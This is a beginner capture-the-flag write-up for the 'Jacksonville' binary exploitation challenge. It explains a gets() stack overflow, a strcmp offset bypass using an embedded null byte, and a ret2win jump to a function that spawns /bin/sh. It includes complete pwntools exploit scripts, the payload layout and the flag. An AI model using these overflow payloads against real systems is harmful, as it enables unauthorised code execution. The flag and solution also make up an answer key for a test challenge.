# Jacksonville - Binary Exploitation Writeup

**Challenge:** Jacksonville  
**Category:** Binary Exploitation / Pwn  
**Author:** Oreomeister  
**Difficulty:** Beginner  
**Flag:** `sun{It4chI_b3ats_0b!to_nO_d!ff}`

---

## Table of Contents

1. [Challenge Overview](#challenge-overview)
2. [Initial Analysis](#initial-analysis)
3. [Understanding the Vulnerability](#understanding-the-vulnerability)
4. [The strcmp Bypass Trick](#the-strcmp-bypass-trick)
5. [Stack Layout Deep Dive](#stack-layout-deep-dive)
6. [Understanding RBP (Base Pointer)](#understanding-rbp-base-pointer)
7. [The ret_gadget Question](#the-ret_gadget-question)
8. [Exploitation Strategy](#exploitation-strategy)
9. [Common Beginner Questions](#common-beginner-questions)
10. [Complete Exploit Code](#complete-exploit-code)
11. [Key Takeaways](#key-takeaways)

---

## Challenge Overview

**Challenge Description:**
> The Jacksonville Jaguars are having a rough season, let's cheer them on!!

```bash
$ nc chal.sunshinectf.games 25602
What's the best Florida football team?
> test
WRONG ANSWER!!
```

The program asks for the "best Florida football team" and exits if we give the wrong answer.

---

## Initial Analysis

### Security Protections

```bash
$ checksec --file=jacksonville 
RELRO           STACK CANARY      NX            PIE             
Full RELRO      No canary found   NX enabled    No PIE
```

**Key observations:**
- ✅ **No Stack Canary**: Buffer overflow exploitation is easier!
- ✅ **No PIE**: Fixed addresses - no need for information leaks
- ❌ **NX enabled**: Stack is not executable (can't run shellcode)
- **Full RELRO**: Can't overwrite GOT entries

### Interesting Strings

```bash
$ strings jacksonville
/bin/sh          ← Shell command available!
Jaguars          ← Likely the correct answer
WRONG ANSWER!!   ← Wrong answer message
```

### Dangerous Functions

```bash
$ gdb jacksonville
gef> info functions
0x00000000004011f6  win
0x0000000000401210  vuln
0x00000000004012db  main
```

From `strings` we also see:
- `gets@plt` - ⚠️ **VULNERABLE!** No bounds checking
- `system@plt` - Can execute commands
- `strcmp@plt` - String comparison

---

## Understanding the Vulnerability

### The vuln() Function (Ghidra Decompilation)

```c
void vuln(void)
{
  int iVar1;
  char buffer[104];  // local_68 to local_17 (0x68 bytes)
  
  // Initialize buffer to zeros
  memset(buffer, 0, 104);
  
  printf("What's the best Florida football team?\n> ");
  
  gets(buffer);  // ⚠️ VULNERABLE! No bounds checking!
  
  // Check if "Jaguars" appears at offset 6
  iVar1 = strcmp(buffer + 6, "Jaguars");
  
  if (iVar1 != 0) {
    puts("WRONG ANSWER!!");
    exit(1);
  }
  
  return;
}
```

### The win() Function

```c
void win(void) {
    system("/bin/sh");  // Spawns a shell!
}
```

**Win address:** `0x4011f6`

### Vulnerabilities Identified

1. **Buffer Overflow**: `gets()` has NO bounds checking - reads unlimited input!
2. **Offset Check**: `strcmp(buffer + 6, "Jaguars")` only checks from position 6 onwards
3. **Hidden win()**: Function exists but is never called normally

---

## The strcmp Bypass Trick

### The Check

```c
strcmp(buffer + 6, "Jaguars")
       ↑
   Starts at buffer[6], not buffer[0]!
```

**What this means:**
- First 6 bytes of buffer are **ignored** by strcmp
- Only bytes 6-12 need to contain "Jaguars\0"
- We can put ANYTHING in bytes 0-5!

### The Null Byte Trick

**Important:** We can include `\0` (null byte) in the middle of our payload!

```python
payload = b"aaaaaaJaguars\x00" + b"more data..."
          ↑     ↑          ↑
          0-5   6-13       14+
          
strcmp(payload + 6, "Jaguars") sees:
  payload[6:13] = "Jaguars\0"
  Comparison stops at \0
  Returns 0 (match!) ✓
```

**Key insight:** `gets()` reads until newline, but we can send null bytes within the payload using pwntools!

---

## Stack Layout Deep Dive

### Stack Frame Structure

When `vuln()` is executing, the stack looks like:

```
Address              | Content                | Size
---------------------|------------------------|--------
rbp-0x68 (buffer[0]) | User input starts here |
rbp-0x67 (buffer[1]) | ...                    | 104 bytes
...                  | ...                    | (0x68)
rbp-0x01 (buffer[103])| End of buffer         |
---------------------|------------------------|--------
rbp+0x00             | Saved RBP              | 8 bytes
---------------------|------------------------|--------
rbp+0x08             | Return Address         | 8 bytes ← Our target!
```

### Assembly Proof

```asm
0000000000401210 <vuln>:
  401214:	push   rbp              ; Save old RBP
  401215:	mov    rbp,rsp          ; Set up new frame
  401218:	sub    rsp,0x70         ; Allocate 112 bytes (0x70)
                                    ; (104 for buffer + 8 for alignment)
```

**Buffer starts at `[rbp-0x68]` (104 bytes below RBP)**

### Memory Layout After Overflow

Our payload structure:

```
Position  | Content              | Purpose
----------|----------------------|---------------------------
0-5       | "AAAAAA"             | Padding (ignored by strcmp)
6-13      | "Jaguars\x00"        | Passes strcmp check
14-103    | "AAA...AAA"          | Fill rest of buffer (90 bytes)
----------|----------------------|---------------------------
104-111   | value                | Overwrites saved RBP (8 bytes)
----------|----------------------|---------------------------
112-119   | win_addr             | Overwrites return address (8 bytes)

Total: 120 bytes
```

---

## Understanding RBP (Base Pointer)

### What is RBP?

**RBP (Base Pointer Register)** = A "bookmark" that marks where the current function's stack frame starts.

Think of it like GPS coordinates for the current function.

### Simple Analogy

```
Stack = A book with pages
RBP = A bookmark marking "current chapter starts here"

When you finish a chapter (function returns):
  1. Remove current bookmark (restore old RBP)
  2. Go back to previous chapter (return to caller)
```

### Function Prologue (Setup)

```asm
vuln:
  push   rbp          ; Save caller's bookmark onto stack
  mov    rbp, rsp     ; Set new bookmark to current position
  sub    rsp, 0x68    ; Allocate space for local variables
```

**What happens:**
```
Before:
  RBP = 0x7fffffffde80 (main's frame base)
  
After push rbp:
  Stack: [...][0x7fffffffde80]  ← Old RBP saved here!
  
After mov rbp, rsp:
  RBP = new position (vuln's frame base)
```

### Function Epilogue (Cleanup)

```asm
  leave              ; Equivalent to: mov rsp, rbp; pop rbp
  ret                ; Pop return address and jump
```

**What `leave` does:**
```asm
leave:
  mov rsp, rbp       ; Move stack pointer to frame base
  pop rbp            ; Restore old RBP from stack
```

**Step by step:**
```
Before leave:
  RBP = 0x7fffffffde70 (current frame)
  [rbp] = contains saved RBP value
  
After mov rsp, rbp:
  RSP = 0x7fffffffde70 (points to saved RBP)
  
After pop rbp:
  RBP = [value from stack] ← Restored!
  RSP += 8 (now points to return address)
```

### How RBP is Used

**To access local variables:**
```c
char buffer[104];  // Stored at [rbp-0x68]

// CPU thinks: "buffer is 104 bytes below my bookmark"
```

**To access saved values:**
```asm
mov rax, [rbp]      ; Access saved RBP
mov rax, [rbp+8]    ; Access return address
```

### What is "Saved RBP"?

**Saved RBP = The previous function's RBP value, stored on the stack**

```
When main() calls vuln():
  1. Save main's RBP onto stack (saved RBP)
  2. Set RBP to vuln's frame base
  
When vuln() returns:
  1. Restore main's RBP from saved value
  2. Continue in main with correct frame pointer
```

---

## The ret_gadget Question

### What is a ret_gadget?

**A ret_gadget is an address containing just a `ret` instruction.**

```asm
0x40101a:  c3    ret
```

### What Does `ret` Do?

```asm
ret:
  pop rip         ; Pop address from stack into instruction pointer
  jmp rip         ; Jump to that address

Equivalent to:
  rip = [rsp]     ; Read address from stack
  rsp += 8        ; Move stack pointer up 8 bytes
```

### Why Are ret_gadgets Used?

**For stack alignment!** Modern libc functions (like `system()`) require RSP to be 16-byte aligned.

```
Aligned:     RSP % 16 == 0  ✅
Not aligned: RSP % 16 == 8  ❌
```

Without alignment, `system()` crashes with:
```
movaps XMMWORD PTR [rsp+0x40], xmm0
Segmentation fault (core dumped)
```

### The Two Patterns

**Pattern A: ret_gadget as Return Address (for alignment)**
```python
payload = buffer_fill
payload += p64(any_value)      # Saved RBP
payload += p64(ret_gadget)     # Return address (EXECUTES!)
payload += p64(target)         # Next address
```

Execution: vuln → ret_gadget (executes ret, RSP += 8) → target

**Pattern B: ret_gadget at Saved RBP (Jacksonville's approach)**
```python
payload = buffer_fill
payload += p64(ret_gadget)     # Saved RBP (loaded into RBP, NOT executed)
payload += p64(target)         # Return address (EXECUTES!)
```

Execution: vuln → target (ret_gadget just in RBP register)

### Does Jacksonville Need ret_gadget?

**Short answer: Probably not!**

The provided solutions put `ret_gadget` at the saved RBP location, but this value is **loaded into RBP, not executed as code**. 

Since `win()` doesn't use RBP for anything:
```c
void win(void) {
    system("/bin/sh");  // Doesn't reference RBP at all!
}
```

**Any value at saved RBP should work:**
```python
# All equivalent:
payload += p64(0x40101a)    # ret_gadget (author's choice)
payload += p64(0)           # Zero
payload += p64(0xdeadbeef)  # Any value
```

### How to Know if ret_gadget is Needed?

**Simple test:**

1. **Try without ret_gadget first**
   ```python
   payload += p64(0)         # Saved RBP (any value)
   payload += p64(win_addr)  # Return address
   ```

2. **If it crashes with "movaps" error → need alignment**

3. **If it works → don't need ret_gadget**

For Jacksonville, the value at saved RBP doesn't affect alignment - only the return address execution path matters.

---

## Exploitation Strategy

### Attack Overview

1. **Bypass strcmp check**: Put "Jaguars\0" at offset 6
2. **Overflow buffer**: Write past 104-byte buffer
3. **Overwrite saved RBP**: Any value (we use 0 or ret_gadget)
4. **Overwrite return address**: Point to win() function
5. **Get shell**: win() executes system("/bin/sh")

### Payload Construction

```python
payload = b"A" * 6              # Bytes 0-5: Padding (ignored by strcmp)
payload += b"Jaguars\x00"       # Bytes 6-13: Pass strcmp check
payload += b"A" * 90            # Bytes 14-103: Fill rest of buffer
payload += p64(0)               # Bytes 104-111: Saved RBP (any value)
payload += p64(win_addr)        # Bytes 112-119: Return address
```

**Total: 120 bytes**

### Byte-by-Byte Breakdown

```
Position | Hex Dump              | Meaning
---------|------------------------|----------------------------------
0        | 0x41 ('A')            | Padding byte 1
1        | 0x41 ('A')            | Padding byte 2
2        | 0x41 ('A')            | Padding byte 3
3        | 0x41 ('A')            | Padding byte 4
4        | 0x41 ('A')            | Padding byte 5
5        | 0x41 ('A')            | Padding byte 6
---------|------------------------|----------------------------------
6        | 0x4a ('J')            | strcmp checks from here!
7        | 0x61 ('a')            |
8        | 0x67 ('g')            | "Jaguars"
9        | 0x75 ('u')            |
10       | 0x61 ('a')            |
11       | 0x72 ('r')            |
12       | 0x73 ('s')            |
13       | 0x00 (\0)             | Null terminator (stops strcmp)
---------|------------------------|----------------------------------
14-103   | 0x41...0x41           | 90 'A's (fill buffer)
---------|------------------------|----------------------------------
104-111  | 0x00...0x00           | Saved RBP (8 bytes, value = 0)
---------|------------------------|----------------------------------
112-119  | 0xf6 0x11 0x40 0x00   | Return address = 0x4011f6 (win)
         | 0x00 0x00 0x00 0x00   | (little-endian format)
```

---

## Execution Flow

### Step 1: Send Payload

```
Payload sent:
"AAAAAAJaguars\0" + "AAA...AAA" (90 bytes) + 0 + win_addr
```

### Step 2: gets() Reads Input

```c
gets(buffer);  // Reads all 120 bytes!
```

**Stack after overflow:**
```
buffer[0-5]:    "AAAAAA"
buffer[6-13]:   "Jaguars\0"
buffer[14-103]: "AAA...AAA"
saved RBP:      0x0000000000000000
return addr:    0x00000000004011f6 (win)
```

### Step 3: strcmp Check

```c
strcmp(buffer + 6, "Jaguars")
```

**Comparison:**
```
buffer[6] onwards: "Jaguars\0AAA..."
Expected:          "Jaguars\0"

Match up to \0: YES! ✓
strcmp returns 0
```

Check passes! Program continues (doesn't exit).

### Step 4: vuln() Returns

```asm
4012d9:	leave
4012da:	ret
```

**leave executes:**
```
mov rsp, rbp         ; RSP = RBP
pop rbp              ; RBP = 0 (our overwritten value)
                     ; RSP now points to return address
```

**ret executes:**
```
pop rip              ; RIP = 0x4011f6 (win function!)
jmp 0x4011f6         ; Jump to win!
```

### Step 5: win() Executes

```c
void win(void) {
    system("/bin/sh");  // Shell spawned!
}
```

### Step 6: Shell! 🎉

```bash
$ whoami
ctf
$ cat flag.txt
sun{It4chI_b3ats_0b!to_nO_d!ff}
$
```

---

## Common Beginner Questions

### Q1: Why do we overflow saved RBP?

**A:** Because it's **in the way!** Memory writes sequentially - you cannot skip bytes.

```
To reach return address at position 112,
you MUST write through positions 0-111.

Position 0-103:   Buffer
Position 104-111: Saved RBP ← Can't skip!
Position 112-119: Return address ← Goal
```

### Q2: What value should we put at saved RBP?

**A:** For Jacksonville, **any value works!**

```python
# All of these work:
payload += p64(0)             # Zero
payload += p64(0x40101a)      # ret_gadget
payload += p64(0xdeadbeef)    # Any value
payload += b"BBBBBBBB"        # Random bytes
```

Because `win()` doesn't use RBP for anything.

### Q3: Why does strcmp check at offset 6?

**A:** That's how the code is written!

```c
strcmp(buffer + 6, "Jaguars")
       ↑
   buffer[6] onwards
```

This creates an opportunity: we can put junk in bytes 0-5 and still pass the check!

### Q4: Why 90 bytes of padding?

**A:** Math!

```
Buffer total: 104 bytes
Already used: 6 (padding) + 8 ("Jaguars\0") = 14 bytes
Remaining: 104 - 14 = 90 bytes ✓
```

### Q5: Can we put "Jaguars" at position 0 instead of 6?

**A:** No! The check is:

```c
strcmp(buffer + 6, "Jaguars")
```

It specifically checks starting at **buffer[6]**. If we put "Jaguars" at position 0:
```
buffer[0]: "Jaguars\0..."
buffer[6]: "something else"
strcmp(buffer + 6, "Jaguars") → Fails! ❌
```

### Q6: What is RBP really?

**A:** RBP is a **reference point** (bookmark) for the current function's stack frame.

- Points to the base of the current stack frame
- Used to access local variables: `[rbp-offset]`
- Saved when calling new function, restored when returning

### Q7: Is ret_gadget at saved RBP necessary?

**A:** For Jacksonville, **probably not!**

The ret_gadget value is loaded into RBP but not executed. Since `win()` doesn't use RBP, any value works.

### Q8: How do I know if I need ret_gadget for alignment?

**A:** Simple test:

1. Try without ret_gadget first (use 0 at saved RBP)
2. If it crashes with "movaps" error → need alignment
3. If it works → don't need ret_gadget

For Jacksonville, alignment likely isn't an issue.

### Q9: Why can we include \0 in the middle of our input?

**A:** Because we're using pwntools to send raw bytes!

```python
payload = b"aaaaaaJaguars\x00" + b"more stuff"
          ↑                ↑
      String literal   Explicit null byte

p.sendline(payload)  # Sends all bytes including \0
```

The null byte doesn't terminate the payload when sent this way.

### Q10: What's the difference from Canaveral?

| Feature | Jacksonville | Canaveral |
|---------|--------------|-----------|
| **Complexity** | Simple ret2win | Two-stage RBP manipulation |
| **Leak needed** | No | Yes (stack address) |
| **Stages** | One payload | Two payloads |
| **Trick** | Null byte at offset 6 | Fake RBP calculation |
| **RBP matters** | No (not used by win) | Yes (used in exploit) |
| **Difficulty** | Beginner | Intermediate |

Jacksonville is **much simpler** - just overflow and return to win()!

---

## Complete Exploit Code

### Solution 1: Using pwntools ROP Helper

```python
#!/usr/bin/env python3
from pwn import *

FILE = "./jacksonville"
HOST, PORT = "chal.sunshinectf.games", 25602

context(log_level="info", binary=FILE)
elf = context.binary
rop = ROP(elf)

def launch():
    if args.LOCAL:
        return process(FILE)
    else:
        return remote(HOST, PORT)

def main():
    p = launch()
    
    # Build payload
    answer = b"aaaaaaJaguars\x00"  # 6 bytes padding + "Jaguars" + null
    length = len(answer)             # 14 bytes
    
    payload = flat(
        answer,                      # Pass strcmp check
        b"A" * (0x68 - length),      # Fill buffer (90 bytes)
        rop.ret.address,             # Saved RBP (any value, using ret)
        elf.sym["win"],              # Return address
    )
    
    print(f"[*] Payload length: {len(payload)} bytes")
    print(f"[*] Win function: {hex(elf.sym['win'])}")
    
    # Send exploit
    p.sendlineafter(b"> ", payload)
    
    # Get shell
    p.interactive()

if __name__ == "__main__":
    main()

# Flag: sun{It4chI_b3ats_0b!to_nO_d!ff}
```

### Solution 2: Manual Addresses

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF("./jacksonville")
context.binary = elf
context(arch="amd64", os="linux", log_level="info")

# Connect
p = remote("chal.sunshinectf.games", 25602)
# p = process(["./jacksonville"])  # For local testing

# Addresses
win_addr = elf.symbols["win"]    # 0x4011f6

# Build payload
payload = b"A" * 6              # Padding (ignored by strcmp)
payload += b"Jaguars\x00"       # Pass strcmp check at offset 6
payload += b"A" * 90            # Fill rest of buffer
payload += p64(0)               # Saved RBP (any value, we use 0)
payload += p64(win_addr)        # Return address → win()

print(f"[*] Payload length: {len(payload)} bytes")
print(f"[*] Win address: {hex(win_addr)}")

# Send exploit
p.sendlineafter(b"> ", payload)

# Get shell!
print("[+] Shell should spawn!")
p.interactive()

# Flag: sun{It4chI_b3ats_0b!to_nO_d!ff}
```

### Solution 3: Minimal Version

```python
from pwn import *

p = remote("chal.sunshinectf.games", 25602)

# One-liner payload
payload = b"A" * 6 + b"Jaguars\x00" + b"A" * 90 + p64(0) + p64(0x4011f6)

p.sendlineafter(b"> ", payload)
p.interactive()
```

---

## Running the Exploit

```bash
$ python3 exploit.py
[*] '/path/to/jacksonville'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to chal.sunshinectf.games on port 25602
[*] Payload length: 120 bytes
[*] Win address: 0x4011f6
[+] Shell should spawn!
[*] Switching to interactive mode
$ whoami
ctf
$ cat flag.txt
sun{It4chI_b3ats_0b!to_nO_d!ff}
$ exit
[*] Got EOF while reading in interactive
```

---

## Key Takeaways

### Core Concepts

1. **Buffer Overflow Basics**
   - `gets()` has no bounds checking - classic vulnerability
   - Overflow to overwrite return address
   - Control program execution flow

2. **String Comparison Bypass**
   - `strcmp(buffer + 6, ...)` only checks from offset 6
   - First 6 bytes are ignored - use for padding
   - Null byte stops string comparison

3. **Null Bytes in Payloads**
   - Can include `\0` in middle of payload with pwntools
   - `gets()` reads until newline, not null
   - `sendline()` sends all bytes including embedded nulls

4. **Stack Frame Structure**
   - Buffer → Saved RBP → Return Address
   - Must write through saved RBP to reach return address
   - Cannot skip bytes in memory

5. **RBP (Base Pointer)**
   - Reference point for current function's stack
   - Saved on function call, restored on return
   - Used to access local variables

6. **ret_gadget Usage**
   - Used for stack alignment (RSP % 16 == 0)
   - Must be **executed** (at return address) to help alignment
   - Placing at saved RBP doesn't execute it

### Exploitation Techniques

| Technique | Purpose |
|-----------|---------|
| **Buffer Overflow** | Overwrite return address |
| **ret2win** | Return directly to hidden win() function |
| **strcmp Bypass** | Use offset check to bypass string validation |
| **Null Byte Trick** | Stop strcmp early while continuing overflow |

### Common Pitfalls

❌ **Putting "Jaguars" at wrong offset**  
✅ Must be at exactly byte 6-13

❌ **Forgetting null terminator**  
✅ Include `\x00` after "Jaguars"

❌ **Wrong padding calculation**  
✅ 6 + 8 + 90 = 104 bytes total to saved RBP

❌ **Thinking saved RBP value matters**  
✅ For Jacksonville, any value works (win doesn't use RBP)

❌ **Confusing saved RBP with ret_gadget execution**  
✅ Value at saved RBP is loaded into RBP, not executed

### Debug Tips

1. **Test strcmp bypass:**
   ```bash
   echo "aaaaaaJaguars" | ./jacksonville
   # Should NOT say "WRONG ANSWER"
   ```

2. **Check buffer size:**
   ```bash
   python3 -c "print('A'*104)" | ./jacksonville
   # Should work without crashing
   
   python3 -c "print('A'*120)" | ./jacksonville
   # Should crash (overwrote return address)
   ```

3. **Use GDB to verify:**
   ```bash
   gdb ./jacksonville
   break *0x4012da  # Break at ret in vuln
   run
   # Send payload
   x/20gx $rsp      # Check stack contents
   ```

---

## Comparison with Other Challenges

### Jacksonville vs Canaveral

| Aspect | Jacksonville | Canaveral |
|--------|--------------|-----------|
| **Main trick** | strcmp offset bypass | RBP manipulation |
| **Stages** | 1 (single payload) | 2 (leak + exploit) |
| **Leak needed** | No | Yes (stack address) |
| **RBP usage** | Not used | Critical (controls [rbp-0x10]) |
| **Alignment** | Likely not needed | Needs ret gadget |
| **Difficulty** | Beginner | Intermediate |

### Why Jacksonville is Easier

1. **No PIE** → Fixed addresses, no leak needed
2. **Simple ret2win** → Just overflow and return
3. **No RBP tricks** → Don't need to calculate offsets
4. **One payload** → No multi-stage complexity
5. **Direct win()** → No argument setup needed

---

## References and Further Reading

- [Buffer Overflow Basics](https://en.wikipedia.org/wiki/Buffer_overflow)
- [x86-64 Stack Frame Layout](https://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64)
- [gets() Man Page](https://man7.org/linux/man-pages/man3/gets.3.html) (see warnings!)
- [strcmp() Behavior](https://man7.org/linux/man-pages/man3/strcmp.3.html)
- [Pwntools Documentation](https://docs.pwntools.com/)

---

## Additional Challenges

If you enjoyed Jacksonville, try these similar beginner challenges:
- **ret2win** - Classic return-to-win pattern
- **split** - Similar buffer overflow with argument passing
- **callme** - Chain multiple function calls

For the next level of difficulty:
- **Canaveral** (from same CTF) - Two-stage RBP manipulation
- **ret2libc** - Return to library functions
- **ROP Emporium** - Learn ROP chains

---
